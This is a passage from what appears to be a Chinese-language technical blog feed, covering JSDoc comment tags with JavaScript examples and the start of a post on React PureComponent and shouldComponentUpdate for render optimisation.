comment">/** * @license MIT */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * @license * Copyright (c) 2015 Example Corporation Inc. * * Permission is hereby granted, free of charge, to any person obtaining a copy * of this software and associated documentation files (the "Software"), to deal * in the Software without restriction, including without limitation the rights * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell * copies of the Software, and to permit persons to whom the Software is * furnished to do so, subject to the following conditions: * ... */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="version"><a href="#version" class="headerlink" title="@version"></a>@version</h4><p>描述当前项目的版本号；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * 这个版本修复了...问题 * @version 1.2.3 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="since"><a href="#since" class="headerlink" title="@since"></a>@since</h4><p>描述某个功能是从哪个版本开始引入的；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * 提供了...功能 * @since 1.2.1 */</span><span class="token keyword">function</span> <span class="token function">newFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="see"><a href="#see" class="headerlink" title="@see"></a>@see</h4><p>类似于“另见”、“详见”的意思，引导至其他位置，也可以使用 <code>@link</code> 引导至某一网络地址；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * @see fn2 */</span><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * @see &#123;@link http://example.com|some text&#125; */</span><span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="todo"><a href="#todo" class="headerlink" title="@todo"></a>@todo</h4><p>描述接下来准备做的事情；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * @todo 添加...功能 * @todo 修复...bug */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="function"><a href="#function" class="headerlink" title="@function"></a>@function</h4><p>与 <code>@func</code>, <code>@method</code> 含义相同，描述一个函数；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** @function */</span><span class="token keyword">var</span> <span class="token function-variable function">myFn</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="type"><a href="#type" class="headerlink" title="@type"></a>@type</h4><p>描述一个变量的类型；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * 一个对象类型的变量 * @type &#123;object&#125; */</span><span class="token keyword">var</span> val1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 一个字符或者数字类型的变量 * @type &#123;(string|number)&#125; */</span><span class="token keyword">var</span> val2<span class="token punctuation">;</span><span class="token comment">/** * 类型为数字或为空 * @type &#123;?number&#125; */</span><span class="token keyword">var</span> val3<span class="token punctuation">;</span><span class="token comment">/** * 类型为数字或且不能为空 * @type &#123;!number&#125; */</span><span class="token keyword">var</span> val4<span class="token punctuation">;</span><span class="token comment">/** * 一个 MyClass 类的实例数组 * @type &#123;Array.&lt;MyClass>&#125; */</span><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/** * 一个字符串的数组 * @type &#123;string[]&#125; */</span><span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">/** * 一个包含一个字符串和一个数字类型的对象 * @type &#123;object.&lt;string, number>&#125; */</span><span class="token keyword">var</span> obj1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> raw <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 指定具体键和类型的对象 * @type &#123;&#123;a: string, b: number&#125;&#125; */</span><span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endraw <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 指定具体键和类型的命名对象 * @type &#123;object&#125; obj3 * @type &#123;string&#125; obj3.a * @type &#123;number&#125; obj3.b */</span><span class="token keyword">var</span> obj3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="param"><a href="#param" class="headerlink" title="@param"></a>@param</h4><p>与 <code>@arg</code>, <code>@argument</code> 含义相同，描述一个函数的参数信息；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * 标签后跟参数类型，然后是参数名，最后是参数描述 * @param &#123;number&#125; a 这里写变量的描述 * @param &#123;string&#125; b - 或者加上连字符便于阅读 * @param &#123;string&#125; c - 又或者这个参数有一个很长很长很长 * 很长很长很长很长很长非常长的描述，可以这样占用多行 */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 传入的参数是个对象 * @param &#123;object&#125; option - 传入的对象参数 * @param &#123;string&#125; option.name - 对象的 name 属性 * @param &#123;number&#125; option.age - 对象的 age 属性 */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">option</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> name <span class="token operator">=</span> option<span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token keyword">var</span> age <span class="token operator">=</span> option<span class="token punctuation">.</span>age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 传入的参数是个字符串组成的数组 * @param &#123;string[]&#125; arr - 传入的对象参数 */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> name <span class="token operator">=</span> option<span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token keyword">var</span> age <span class="token operator">=</span> option<span class="token punctuation">.</span>age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 表示某个参数是可选的 * @param &#123;number&#125; a - 这是必填参数 * @param &#123;number&#125; [b] - 这是可选参数 * @param &#123;number=&#125; c - 可选参数的另一种表示 */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 表示可选参数的默认值 * @param &#123;number&#125; a * @param &#123;number&#125; [b=3] - 默认值为 3 */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 参数类型的各种表示 * @param &#123;number&#125; a - 类型为数字 * @param &#123;number|string&#125; b - 类型为数字或字符串 * @param &#123;?number&#125; c - 类型为数字或者为空（null） * @param &#123;!number&#125; d - 类型为数字且不为空 * @param &#123;*&#125; e - 类型不做限制，即可以为任意类型 */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 表示具有任意多个参数的函数 * 下面的函数返回所有传入参数的和 * @param &#123;...number&#125; num - 参数个数任意，但是都是数字类型 */</span><span class="token keyword">function</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        result <span class="token operator">+=</span> arguments<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="typedef"><a href="#typedef" class="headerlink" title="@typedef"></a>@typedef</h4><p>用于描述自定义的变量类型；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * 关于自定义类型的描述 * @typedef &#123;(string|number)&#125; myType */</span><span class="token comment">/** * 关于自定义类型的描述 * @type &#123;myType&#125; val - 使用自定义的类型 */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="callback"><a href="#callback" class="headerlink" title="@callback"></a>@callback</h4><p>描述指定函数中作为回调函数的参数信息；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * 这是关于回调函数的描述 * @callback myCallback * @param &#123;string&#125; aa - 回调函数接受的参数 * @param &#123;number&#125; [bb] - 回调函数接受的另一个可选参数 */</span> <span class="token comment">/** * 这是关于函数本身的描述 * @param &#123;string&#125; a * @param &#123;myCallback&#125; callback - 回调函数 */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="returns"><a href="#returns" class="headerlink" title="@returns"></a>@returns</h4><p>或者写作 <code>@return</code>，描述函数的返回值的信息；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * @param &#123;number&#125; a * @returns &#123;number&#125; 关于返回值的描述 */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * @param &#123;number&#125; a * @returns &#123;(number|string)&#125; 返回值可能是数字或字符类型 */</span><span class="token keyword">function</span> <span class="token function">myFn2</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">'no.'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="example"><a href="#example" class="headerlink" title="@example"></a>@example</h4><p>描述指定代码的使用示例；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * 添加示例代码（格式会被高亮展示） * @param &#123;string&#125; a * @param &#123;string&#125; b * @returns &#123;string&#125; return a concat b. * * @example * console.log(myFn('hello ', 'world!')); * // "hello world!" */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="class"><a href="#class" class="headerlink" title="@class"></a>@class</h4><p>描述一个 <code>class</code> 类；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * 关于该类的描述 * @class */</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 或者是一个构造函数 * @class */</span><span class="token keyword">function</span> <span class="token function">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> ins <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="namespace"><a href="#namespace" class="headerlink" title="@namespace"></a>@namespace</h4><p>描述一个命名空间；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * 指定一个对象对命名空间 * @namespace */</span><span class="token keyword">var</span> MyNamespace <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 表示为 MyNamespace.fn     * @returns &#123;*&#125;     */</span>    <span class="token function-variable function">fn</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">/**     * 表示为 MyNamespace.a     * @type &#123;number&#125;     */</span>    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 手动指定命名空间 * @namespace MyNamespace */</span><span class="token comment">/** * 一个成员函数，MyNamespace.myFn * @function * @returns &#123;*&#125; * @memberof MyNamespace */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="member"><a href="#member" class="headerlink" title="@member"></a>@member</h4><p>描述当前类的一个成员；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * @class */</span><span class="token keyword">function</span> <span class="token function">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/** @member &#123;string&#125; */</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'knightyun'</span><span class="token punctuation">;</span>        <span class="token comment">/**     * 或者一个虚拟的成员     * @member &#123;number&#125; age     */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="memberof"><a href="#memberof" class="headerlink" title="@memberof"></a>@memberof</h4><p>描述成员所属的类；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * @class */</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * @constructor     * @memberof MyClass     */</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token comment">/*     * @param &#123;string&#125; val     * @returns &#123;*&#125;     * @memberof MyClass     */</span>    <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jsdoc 注释 规范化 格式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 组件性能优化之 PureComponent 的使用</title>
      <link href="/2024/09/27/javascript/react-zu-jian-xing-neng-you-hua-zhi-purecomponent-de-shi-yong/"/>
      <url>/2024/09/27/javascript/react-zu-jian-xing-neng-you-hua-zhi-purecomponent-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<p>在 React 类组件中，如果状态（<code>state</code>）发生变化，便会触发组件的重新渲染（执行 <code>render</code> 方法），并且是包括所有子组件在内的全部重渲染，无论某些子组件是否有用到 <code>state</code> 中的值；但有些时候部分子组件计算或渲染工作量较大，并且只做一些情况单一的展示工作，那么在更新状态时对其的渲染，便是额外的性能负担，所以需要寻求一些优化手段；</p><h2 id="shouldComponentUpdate"><a href="#shouldComponentUpdate" class="headerlink" title="shouldComponentUpdate"></a>shouldComponentUpdate</h2><p><code>shouldComponentUpdate</code> 是 React 的生命周期函数之一，它会在每次渲染（<code>render</code>）之前被调用，并且根据该函数的返回值（<code>true</code>/<code>false</code>）来决定是否调用渲染函数（<code>return true</code> 触发渲染，<code>return false</code> 阻止渲染），但是组件的首次渲染或者调用 <code>forceUpdate()</code> 方法时<strong>不会</strong>触发调用 <code>shouldComponentUpdate</code> 方法；该生命周期函数的<strong>默认行为</strong>是在每次 <code>state</code> 发生变化时触发重新渲染，如果自行声明该函数会<strong>覆盖</strong>这一默认行为，需要自行判断 <code>state</code> 的变化以决定是否重新渲染；</p><p><code>shouldComponentUpdate</code> 方法接收两个传参：<code>(nextProps, nextState)</code>，分别表示变化后的 <code>props</code>（组件的参数） 和 <code>state</code>（组件的状态）；</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">class</span> <span class="token class-name">MyComponent</span> <span class="token keyword">extends</span> <span class="token class-name">React</span><span class="token punctuation">.</span>Component <span class="token punctuation">&#123;</span>  state <span class="token operator">=</span> <span class="token punctuation">&#123;</span> count<span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">shouldComponentUpdate</span><span class="token punctuation">(</span>nextProps<span class="token punctuation">,</span> nextState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 无需手动更新 state 值，组件会自动更新</span>    <span class="token comment">// this.setState(&#123; ...nextState &#125;);</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nextState<span class="token punctuation">.</span>count <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// count 值大于 3 后，组件便不再更新</span>      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> count <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>      <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> count<span class="token operator">:</span> count <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token operator">></span>        <span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span>      <span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PureComponent"><a href="#PureComponent" class="headerlink" title="PureComponent"></a>PureComponent</h2><p><code>React.PureComponent</code> 类似于我们常用的 <code>React.Component</code>，区别在于 <code>PureComponent</code> 的内置 <code>shouldComponentUpdate</code> 逻辑，它会同时对 <code>props</code> 和 <code>state</code> 的变化前和变化后的值进行<strong>浅对比</strong>，如果都没发生变化则会跳过重渲染，相当于多了一层 <code>props</code> 对比；下面通过一个简单的例子来对比这两种组件的效果差异；</p><h3 id="效果对比"><a href="#效果对比" class="headerlink" title="效果对比"></a>效果对比</h3><p>假设有一个计数器，点击按钮增加计数，并用两种组件渲染计数值：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">class</span> <span class="token class-name">Counter</span> <span class="token keyword">extends</span> <span class="token class-name">React</span><span class="token punctuation">.</span>Component <span class="token punctuation">&#123;</span>  state <span class="token operator">=</span> <span class="token punctuation">&#123;</span> count<span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> count <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>      <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> float<span class="token operator">:</span> <span class="token string">"right"</span><span class="token punctuation">,</span> textAlign<span class="token operator">:</span> <span class="token string">'right'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">></span>        <span class="token operator">&lt;</span>div<span class="token operator">></span>count<span class="token operator">:</span> <span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>        <span class="token operator">&lt;</span>CountText count<span class="token operator">=</span><span class="token punctuation">&#123;</span>count <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">?</span> count <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>ConstText count<span class="token operator">=</span><span class="token punctuation">&#123;</span>count <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">?</span> count <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> count<span class="token operator">:</span> count <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token operator">></span>Add<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 普通组件</span><span class="token keyword">class</span> <span class="token class-name">CountText</span> <span class="token keyword">extends</span> <span class="token class-name">React</span><span class="token punctuation">.</span>Component <span class="token punctuation">&#123;</span>  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> count <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">;</span>    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'normal rendered'</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">></span>normal<span class="token operator">:</span> <span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// “纯”组件</span><span class="token keyword">class</span> <span class="token class-name">ConstText</span> <span class="token keyword">extends</span> <span class="token class-name">React</span><span class="token punctuation">.</span>PureComponent <span class="token punctuation">&#123;</span>  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> count <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">;</span>    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pure rendered'</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">></span>pure<span class="token operator">:</span> <span class="token punctuation">&#123;</span>count<span 